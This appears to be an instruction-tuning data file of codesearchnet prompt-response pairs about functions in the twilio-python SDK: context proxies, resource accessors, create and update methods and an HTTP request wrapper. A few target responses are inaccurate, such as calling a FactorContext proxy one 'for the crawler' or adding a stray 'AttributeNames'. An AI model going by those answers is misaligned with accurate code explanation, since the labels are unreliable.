{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: ConferenceContext for this ConferenceInstance\n        :rtype: twilio.rest.api.v2010.account.conference.ConferenceContext\n        \"\"\"\n        if self._context is None:\n            self._context = ConferenceContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, status=values.unset, announce_url=values.unset,\n               announce_method=values.unset):\n        \"\"\"\n        Update the ConferenceInstance\n\n        :param ConferenceInstance.UpdateStatus status: The new status of the resource\n        :param unicode announce_url: The URL we should call to announce something into the conference\n        :param unicode announce_method: he HTTP method used to call announce_url\n\n        :returns: Updated ConferenceInstance\n        :rtype: twilio.rest.api.v2010.account.conference.ConferenceInstance\n        \"\"\"\n        return self._proxy.update(status=status, announce_url=announce_url, announce_method=announce_method, )", "response": "Update the ConferenceInstance\n\n        :param ConferenceInstance.UpdateStatus status: The new status of the resource\n        :param unicode announce_url: The URL we should call to announce something into the conference\n        :param unicode announce_method: he HTTP method used to call announce_url\n\n        :returns: Updated ConferenceInstance\n        :rtype: twilio.rest.api.v2010.account.conference.ConferenceInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create(self, friendly_name=values.unset, unique_name=values.unset,\n               attributes=values.unset, type=values.unset,\n               date_created=values.unset, date_updated=values.unset,\n               created_by=values.unset):\n        \"\"\"\n        Create a new ChannelInstance\n\n        :param unicode friendly_name: A string to describe the new resource\n        :param unicode unique_name: An application-defined string that uniquely identifies the resource\n        :param unicode attributes: A valid JSON string that contains application-specific data\n        :param ChannelInstance.ChannelType type: The visibility of the channel\n        :param datetime date_created: The ISO 8601 date and time in GMT when the resource was created\n        :param datetime date_updated: The ISO 8601 date and time in GMT when the resource was updated\n        :param unicode created_by: The identity of the User that created the Channel\n\n        :returns: Newly created ChannelInstance\n        :rtype: twilio.rest.chat.v2.service.channel.ChannelInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'UniqueName': unique_name,\n            'Attributes': attributes,\n            'Type': type,\n            'DateCreated': serialize.iso8601_datetime(date_created),\n            'DateUpdated': serialize.iso8601_datetime(date_updated),\n            'CreatedBy': created_by,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ChannelInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Create a new ChannelInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef webhooks(self):\n        if self._webhooks is None:\n            self._webhooks = WebhookList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                channel_sid=self._solution['sid'],\n            )\n        return self._webhooks", "response": "Access the webhooks\n\n        :returns: twilio.rest.chat.v2.service.channel.webhook.WebhookList\n        :rtype: twilio.rest.chat.v2.service.channel.webhook.WebhookList"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconstructing a ParticipantContext :param sid: The sid :returns: twilio.rest.video.v1.room.room_participant.ParticipantContext :rtype: twilio.rest.video.v1.room.room_participant.ParticipantContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a ParticipantContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.video.v1.room.room_participant.ParticipantContext\n        :rtype: twilio.rest.video.v1.room.room_participant.ParticipantContext\n        \"\"\"\n        return ParticipantContext(self._version, room_sid=self._solution['room_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return ParticipantInstance(self._version, payload, room_sid=self._solution['room_sid'], )", "response": "Build an instance of ParticipantInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the published_tracks :returns: twilio.rest.video.v1.room.room_participant.room_participant_published_track.PublishedTrackList :rtype: twilio.rest.video.v1.room.room_participant.room_participant_published_track.PublishedTrackList", "response": "def published_tracks(self):\n        \"\"\"\n        Access the published_tracks\n\n        :returns: twilio.rest.video.v1.room.room_participant.room_participant_published_track.PublishedTrackList\n        :rtype: twilio.rest.video.v1.room.room_participant.room_participant_published_track.PublishedTrackList\n        \"\"\"\n        if self._published_tracks is None:\n            self._published_tracks = PublishedTrackList(\n                self._version,\n                room_sid=self._solution['room_sid'],\n                participant_sid=self._solution['sid'],\n            )\n        return self._published_tracks"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef subscribed_tracks(self):\n        if self._subscribed_tracks is None:\n            self._subscribed_tracks = SubscribedTrackList(\n                self._version,\n                room_sid=self._solution['room_sid'],\n                subscriber_sid=self._solution['sid'],\n            )\n        return self._subscribed_tracks", "response": "Access the subscribed_tracks\n\n        :returns: twilio.rest.video.v1.room.room_participant.room_participant_subscribed_track.SubscribedTrackList\n        :rtype: twilio.rest.video.v1.room.room_participant.room_participant_subscribed_track.SubscribedTrackList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _proxy(self):\n        if self._context is None:\n            self._context = ParticipantContext(\n                self._version,\n                room_sid=self._solution['room_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the participant"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create(self, friendly_name=values.unset, log_queries=values.unset,\n               unique_name=values.unset, callback_url=values.unset,\n               callback_events=values.unset, style_sheet=values.unset,\n               defaults=values.unset):\n        \"\"\"\n        Create a new AssistantInstance\n\n        :param unicode friendly_name: A string to describe the new resource\n        :param bool log_queries: Whether queries should be logged and kept after training\n        :param unicode unique_name: An application-defined string that uniquely identifies the new resource\n        :param unicode callback_url: Reserved\n        :param unicode callback_events: Reserved\n        :param dict style_sheet: A JSON string that defines the Assistant's style sheet\n        :param dict defaults: A JSON object that defines the Assistant's default tasks for various scenarios\n\n        :returns: Newly created AssistantInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.AssistantInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'LogQueries': log_queries,\n            'UniqueName': unique_name,\n            'CallbackUrl': callback_url,\n            'CallbackEvents': callback_events,\n            'StyleSheet': serialize.object(style_sheet),\n            'Defaults': serialize.object(defaults),\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AssistantInstance(self._version, payload, )", "response": "Create a new AssistantInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef field_types(self):\n        if self._field_types is None:\n            self._field_types = FieldTypeList(self._version, assistant_sid=self._solution['sid'], )\n        return self._field_types", "response": "Access the field_types\n\n        :returns: twilio.rest.autopilot.v1.assistant.field_type.FieldTypeList\n        :rtype: twilio.rest.autopilot.v1.assistant.field_type.FieldTypeList"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\naccessing the tasks :returns: twilio.rest.autopilot.v1.assistant.task.TaskList :rtype: twilio.rest.autopilot.v1.assistant.task.TaskList", "response": "def tasks(self):\n        \"\"\"\n        Access the tasks\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.TaskList\n        :rtype: twilio.rest.autopilot.v1.assistant.task.TaskList\n        \"\"\"\n        if self._tasks is None:\n            self._tasks = TaskList(self._version, assistant_sid=self._solution['sid'], )\n        return self._tasks"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef model_builds(self):\n        if self._model_builds is None:\n            self._model_builds = ModelBuildList(self._version, assistant_sid=self._solution['sid'], )\n        return self._model_builds", "response": "Access the model_builds\n\n        :returns: twilio.rest.autopilot.v1.assistant.model_build.ModelBuildList\n        :rtype: twilio.rest.autopilot.v1.assistant.model_build.ModelBuildList"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the queries :returns: twilio.rest.autopilot.v1.assistant.query.QueryList :rtype: twilio.rest.autopilot.v1.assistant.query.QueryList", "response": "def queries(self):\n        \"\"\"\n        Access the queries\n\n        :returns: twilio.rest.autopilot.v1.assistant.query.QueryList\n        :rtype: twilio.rest.autopilot.v1.assistant.query.QueryList\n        \"\"\"\n        if self._queries is None:\n            self._queries = QueryList(self._version, assistant_sid=self._solution['sid'], )\n        return self._queries"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the style_sheet :returns: twilio.rest.autopilot.v1.assistant.style_sheet.StyleSheetList :rtype: twilio.rest.autopilot.v1.assistant.style_sheet.StyleSheetList", "response": "def style_sheet(self):\n        \"\"\"\n        Access the style_sheet\n\n        :returns: twilio.rest.autopilot.v1.assistant.style_sheet.StyleSheetList\n        :rtype: twilio.rest.autopilot.v1.assistant.style_sheet.StyleSheetList\n        \"\"\"\n        if self._style_sheet is None:\n            self._style_sheet = StyleSheetList(self._version, assistant_sid=self._solution['sid'], )\n        return self._style_sheet"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef defaults(self):\n        if self._defaults is None:\n            self._defaults = DefaultsList(self._version, assistant_sid=self._solution['sid'], )\n        return self._defaults", "response": "Access the defaults\n\n        :returns: twilio.rest.autopilot.v1.assistant.defaults.DefaultsList\n        :rtype: twilio.rest.autopilot.v1.assistant.defaults.DefaultsList"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the dialogues :returns: twilio.rest.autopilot.v1.assistant.dialogue.DialogueList :rtype: twilio.rest.autopilot.v1.assistant.dialogue.DialogueList", "response": "def dialogues(self):\n        \"\"\"\n        Access the dialogues\n\n        :returns: twilio.rest.autopilot.v1.assistant.dialogue.DialogueList\n        :rtype: twilio.rest.autopilot.v1.assistant.dialogue.DialogueList\n        \"\"\"\n        if self._dialogues is None:\n            self._dialogues = DialogueList(self._version, assistant_sid=self._solution['sid'], )\n        return self._dialogues"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate an instance context for the AssistantInstance", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: AssistantContext for this AssistantInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.AssistantContext\n        \"\"\"\n        if self._context is None:\n            self._context = AssistantContext(self._version, sid=self._solution['sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update(self, friendly_name=values.unset, log_queries=values.unset,\n               unique_name=values.unset, callback_url=values.unset,\n               callback_events=values.unset, style_sheet=values.unset,\n               defaults=values.unset):\n        \"\"\"\n        Update the AssistantInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param bool log_queries: Whether queries should be logged and kept after training\n        :param unicode unique_name: An application-defined string that uniquely identifies the resource\n        :param unicode callback_url: Reserved\n        :param unicode callback_events: Reserved\n        :param dict style_sheet: A JSON string that defines the Assistant's style sheet\n        :param dict defaults: A JSON object that defines the Assistant's [default tasks](https://www.twilio.com/docs/autopilot/api/assistant/defaults) for various scenarios\n\n        :returns: Updated AssistantInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.AssistantInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            log_queries=log_queries,\n            unique_name=unique_name,\n            callback_url=callback_url,\n            callback_events=callback_events,\n            style_sheet=style_sheet,\n            defaults=defaults,\n        )", "response": "Update the AssistantInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param bool log_queries: Whether queries should be logged and kept after training\n        :param unicode unique_name: An application-defined string that uniquely identifies the resource\n        :param unicode callback_url: Reserved\n        :param unicode callback_events: Reserved\n        :param dict style_sheet: A JSON string that defines the Assistant's style sheet\n        :param dict defaults: A JSON object that defines the Assistant's [default tasks](https://www.twilio.com/docs/autopilot/api/assistant/defaults) for various scenarios\n\n        :returns: Updated AssistantInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.AssistantInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncreate a new FactorInstance", "response": "def create(self, binding, friendly_name, factor_type):\n        \"\"\"\n        Create a new FactorInstance\n\n        :param unicode binding: A unique binding for this Factor\n        :param unicode friendly_name: The friendly name of this Factor\n        :param FactorInstance.FactorTypes factor_type: The Type of this Factor\n\n        :returns: Newly created FactorInstance\n        :rtype: twilio.rest.authy.v1.service.entity.factor.FactorInstance\n        \"\"\"\n        data = values.of({'Binding': binding, 'FriendlyName': friendly_name, 'FactorType': factor_type, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return FactorInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            identity=self._solution['identity'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get(self, sid):\n        return FactorContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            identity=self._solution['identity'],\n            sid=sid,\n        )", "response": "Constructs a FactorContext\n\n        :param sid: A string that uniquely identifies this Factor.\n\n        :returns: twilio.rest.authy.v1.service.entity.factor.FactorContext\n        :rtype: twilio.rest.authy.v1.service.entity.factor.FactorContext"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild an instance of FactorInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of FactorInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.authy.v1.service.entity.factor.FactorInstance\n        :rtype: twilio.rest.authy.v1.service.entity.factor.FactorInstance\n        \"\"\"\n        return FactorInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            identity=self._solution['identity'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the challenges :returns: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeList :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeList", "response": "def challenges(self):\n        \"\"\"\n        Access the challenges\n\n        :returns: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeList\n        :rtype: twilio.rest.authy.v1.service.entity.factor.challenge.ChallengeList\n        \"\"\"\n        if self._challenges is None:\n            self._challenges = ChallengeList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                identity=self._solution['identity'],\n                factor_sid=self._solution['sid'],\n            )\n        return self._challenges"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = FactorContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                identity=self._solution['identity'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the crawler"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nstreaming CommandInstance records from the API as a generator.", "response": "def stream(self, device=values.unset, sim=values.unset, status=values.unset,\n               direction=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Streams CommandInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param unicode device: The device\n        :param unicode sim: The sim\n        :param unicode status: The status\n        :param unicode direction: The direction\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.preview.wireless.command.CommandInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            device=device,\n            sim=sim,\n            status=status,\n            direction=direction,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef list(self, device=values.unset, sim=values.unset, status=values.unset,\n             direction=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists CommandInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode device: The device\n        :param unicode sim: The sim\n        :param unicode status: The status\n        :param unicode direction: The direction\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.preview.wireless.command.CommandInstance]\n        \"\"\"\n        return list(self.stream(\n            device=device,\n            sim=sim,\n            status=status,\n            direction=direction,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Returns a generator that yields CommandInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: CommandContext for this CommandInstance\n        :rtype: twilio.rest.preview.wireless.command.CommandContext\n        \"\"\"\n        if self._context is None:\n            self._context = CommandContext(self._version, sid=self._solution['sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef request(self, method, uri, params=None, data=None, headers=None, auth=None,\n                timeout=None, allow_redirects=False):\n        \"\"\"\n        Makes a request to the Twilio API using the configured http client\n        Authentication information is automatically added if none is provided\n\n        :param str method: HTTP Method\n        :param str uri: Fully qualified url\n        :param dict[str, str] params: Query string parameters\n        :param dict[str, str] data: POST body data\n        :param dict[str, str] headers: HTTP Headers\n        :param tuple(str, str) auth: Authentication\n        :param int timeout: Timeout in seconds\n        :param bool allow_redirects: Should the client follow redirects\n\n        :returns: Response from the Twilio API\n        :rtype: twilio.http.response.Response\n        \"\"\"\n        auth = auth or self.auth\n        headers = headers or {}\n\n        headers['User-Agent'] = 'twilio-python/{} (Python {})'.format(\n            __version__,\n            platform.python_version(),\n        )\n        headers['X-Twilio-Client'] = 'python-{}'.format(__version__)\n        headers['Accept-Charset'] = 'utf-8'\n\n        if method == 'POST' and 'Content-Type' not in headers:\n            headers['Content-Type'] = 'application/x-www-form-urlencoded'\n\n        if 'Accept' not in headers:\n            headers['Accept'] = 'application/json'\n\n        if self.region:\n            head, tail = uri.split('.', 1)\n\n            if not tail.startswith(self.region):\n                uri = '.'.join([head, self.region, tail])\n\n        return self.http_client.request(\n            method,\n            uri,\n            params=params,\n            data=data,\n            headers=headers,\n            auth=auth,\n            timeout=timeout,\n            allow_redirects=allow_redirects\n        )", "response": "Makes a request to the Twilio API using the configured http client."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\naccesses the Accounts Twilio Domain", "response": "def accounts(self):\n        \"\"\"\n        Access the Accounts Twilio Domain\n\n        :returns: Accounts Twilio Domain\n        :rtype: twilio.rest.accounts.Accounts\n        \"\"\"\n        if self._accounts is None:\n            from twilio.rest.accounts import Accounts\n            self._accounts = Accounts(self)\n        return self._accounts"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\naccessing the Api Twilio Domain", "response": "def api(self):\n        \"\"\"\n        Access the Api Twilio Domain\n\n        :returns: Api Twilio Domain\n        :rtype: twilio.rest.api.Api\n        \"\"\"\n        if self._api is None:\n            from twilio.rest.api import Api\n            self._api = Api(self)\n        return self._api"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the Authy Twilio Domain", "response": "def authy(self):\n        \"\"\"\n        Access the Authy Twilio Domain\n\n        :returns: Authy Twilio Domain\n        :rtype: twilio.rest.authy.Authy\n        \"\"\"\n        if self._authy is None:\n            from twilio.rest.authy import Authy\n            self._authy = Authy(self)\n        return self._authy"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef autopilot(self):\n        if self._autopilot is None:\n            from twilio.rest.autopilot import Autopilot\n            self._autopilot = Autopilot(self)\n        return self._autopilot", "response": "Access the Autopilot Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the Chat Twilio Domain", "response": "def chat(self):\n        \"\"\"\n        Access the Chat Twilio Domain\n\n        :returns: Chat Twilio Domain\n        :rtype: twilio.rest.chat.Chat\n        \"\"\"\n        if self._chat is None:\n            from twilio.rest.chat import Chat\n            self._chat = Chat(self)\n        return self._chat"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the Fax Twilio Domain", "response": "def fax(self):\n        \"\"\"\n        Access the Fax Twilio Domain\n\n        :returns: Fax Twilio Domain\n        :rtype: twilio.rest.fax.Fax\n        \"\"\"\n        if self._fax is None:\n            from twilio.rest.fax import Fax\n            self._fax = Fax(self)\n        return self._fax"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef flex_api(self):\n        if self._flex_api is None:\n            from twilio.rest.flex_api import FlexApi\n            self._flex_api = FlexApi(self)\n        return self._flex_api", "response": "Access the FlexApi Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\naccess the Insights Twilio Domain", "response": "def insights(self):\n        \"\"\"\n        Access the Insights Twilio Domain\n\n        :returns: Insights Twilio Domain\n        :rtype: twilio.rest.insights.Insights\n        \"\"\"\n        if self._insights is None:\n            from twilio.rest.insights import Insights\n            self._insights = Insights(self)\n        return self._insights"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\naccessing the IpMessaging Twilio Domain", "response": "def ip_messaging(self):\n        \"\"\"\n        Access the IpMessaging Twilio Domain\n\n        :returns: IpMessaging Twilio Domain\n        :rtype: twilio.rest.ip_messaging.IpMessaging\n        \"\"\"\n        if self._ip_messaging is None:\n            from twilio.rest.ip_messaging import IpMessaging\n            self._ip_messaging = IpMessaging(self)\n        return self._ip_messaging"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\naccessing the Lookups Twilio Domain", "response": "def lookups(self):\n        \"\"\"\n        Access the Lookups Twilio Domain\n\n        :returns: Lookups Twilio Domain\n        :rtype: twilio.rest.lookups.Lookups\n        \"\"\"\n        if self._lookups is None:\n            from twilio.rest.lookups import Lookups\n            self._lookups = Lookups(self)\n        return self._lookups"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef messaging(self):\n        if self._messaging is None:\n            from twilio.rest.messaging import Messaging\n            self._messaging = Messaging(self)\n        return self._messaging", "response": "Access the Messaging Twilio Domain\n       "}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the Monitor Twilio Domain", "response": "def monitor(self):\n        \"\"\"\n        Access the Monitor Twilio Domain\n\n        :returns: Monitor Twilio Domain\n        :rtype: twilio.rest.monitor.Monitor\n        \"\"\"\n        if self._monitor is None:\n            from twilio.rest.monitor import Monitor\n            self._monitor = Monitor(self)\n        return self._monitor"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef notify(self):\n        if self._notify is None:\n            from twilio.rest.notify import Notify\n            self._notify = Notify(self)\n        return self._notify", "response": "Access the Notify Twilio Domain\n       "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\naccessing the Preview Twilio Domain AttributeNames", "response": "def preview(self):\n        \"\"\"\n        Access the Preview Twilio Domain\n\n        :returns: Preview Twilio Domain\n        :rtype: twilio.rest.preview.Preview\n        \"\"\"\n        if self._preview is None:\n            from twilio.rest.preview import Preview\n            self._preview = Preview(self)\n        return self._preview"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef pricing(self):\n        if self._pricing is None:\n            from twilio.rest.pricing import Pricing\n            self._pricing = Pricing(self)\n        return self._pricing", "response": "Access the Pricing Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef proxy(self):\n        if self._proxy is None:\n            from twilio.rest.proxy import Proxy\n            self._proxy = Proxy(self)\n        return self._proxy", "response": "Access the Proxy Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef serverless(self):\n        if self._serverless is None:\n            from twilio.rest.serverless import Serverless\n            self._serverless = Serverless(self)\n        return self._serverless", "response": "Access the Serverless Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the Studio Twilio Domain", "response": "def studio(self):\n        \"\"\"\n        Access the Studio Twilio Domain\n\n        :returns: Studio Twilio Domain\n        :rtype: twilio.rest.studio.Studio\n        \"\"\"\n        if self._studio is None:\n            from twilio.rest.studio import Studio\n            self._studio = Studio(self)\n        return self._studio"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the Sync Twilio Domain", "response": "def sync(self):\n        \"\"\"\n        Access the Sync Twilio Domain\n\n        :returns: Sync Twilio Domain\n        :rtype: twilio.rest.sync.Sync\n        \"\"\"\n        if self._sync is None:\n            from twilio.rest.sync import Sync\n            self._sync = Sync(self)\n        return self._sync"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef taskrouter(self):\n        if self._taskrouter is None:\n            from twilio.rest.taskrouter import Taskrouter\n            self._taskrouter = Taskrouter(self)\n        return self._taskrouter", "response": "Access the Taskrouter Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the Trunking Twilio Domain", "response": "def trunking(self):\n        \"\"\"\n        Access the Trunking Twilio Domain\n\n        :returns: Trunking Twilio Domain\n        :rtype: twilio.rest.trunking.Trunking\n        \"\"\"\n        if self._trunking is None:\n            from twilio.rest.trunking import Trunking\n            self._trunking = Trunking(self)\n        return self._trunking"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef verify(self):\n        if self._verify is None:\n            from twilio.rest.verify import Verify\n            self._verify = Verify(self)\n        return self._verify", "response": "Access the Verify Twilio Domain\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef video(self):\n        if self._video is None:\n            from twilio.rest.video import Video\n            self._video = Video(self)\n        return self._video", "response": "Access the Video Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the Voice Twilio Domain", "response": "def voice(self):\n        \"\"\"\n        Access the Voice Twilio Domain\n\n        :returns: Voice Twilio Domain\n        :rtype: twilio.rest.voice.Voice\n        \"\"\"\n        if self._voice is None:\n            from twilio.rest.voice import Voice\n            self._voice = Voice(self)\n        return self._voice"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef wireless(self):\n        if self._wireless is None:\n            from twilio.rest.wireless import Wireless\n            self._wireless = Wireless(self)\n        return self._wireless", "response": "Access the Wireless Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the credential_list_mappings :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.auth_registrations_credential_list_mapping.AuthRegistrationsCredentialListMappingList :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.auth_registrations_credential_list_mapping.AuthRegistrationsCredentialListMappingList", "response": "def credential_list_mappings(self):\n        \"\"\"\n        Access the credential_list_mappings\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.auth_registrations_credential_list_mapping.AuthRegistrationsCredentialListMappingList\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.auth_registrations_credential_list_mapping.AuthRegistrationsCredentialListMappingList\n        \"\"\"\n        if self._credential_list_mappings is None:\n            self._credential_list_mappings = AuthRegistrationsCredentialListMappingList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                domain_sid=self._solution['domain_sid'],\n            )\n        return self._credential_list_mappings"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_instance(self, payload):\n        return AuthTypeRegistrationsInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n        )", "response": "Build an instance of AuthTypeRegistrationsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create(self, friendly_name, inbound_request_url=values.unset,\n               inbound_method=values.unset, fallback_url=values.unset,\n               fallback_method=values.unset, status_callback=values.unset,\n               sticky_sender=values.unset, mms_converter=values.unset,\n               smart_encoding=values.unset, scan_message_content=values.unset,\n               fallback_to_long_code=values.unset, area_code_geomatch=values.unset,\n               validity_period=values.unset, synchronous_validation=values.unset):\n        \"\"\"\n        Create a new ServiceInstance\n\n        :param unicode friendly_name: A human readable descriptive text for this resource, up to 64 characters.\n        :param unicode inbound_request_url: A webhook request is made to the Inbound Request URL when a message is received by any phone number or shortcode associated to your Messaging Service.\n        :param unicode inbound_method: The HTTP method used when making requests to the Inbound Request URL.\n        :param unicode fallback_url: A request is made to the Fallback URL if an error occurs with retrieving or executing the TwiML from you Inbound Request URL.\n        :param unicode fallback_method: The HTTP method used when requesting the Fallback URL.\n        :param unicode status_callback: A webhook request is made to the Status Callback to pass status updates about your messages.\n        :param bool sticky_sender: Configuration to enable or disable Sticky Sender on your Service Instance.\n        :param bool mms_converter: Configuration to enable or disable MMS Converter on your Service Instance.\n        :param bool smart_encoding: Configuration to enable or disable Smart Encoding.\n        :param ServiceInstance.ScanMessageContent scan_message_content: The scan_message_content\n        :param 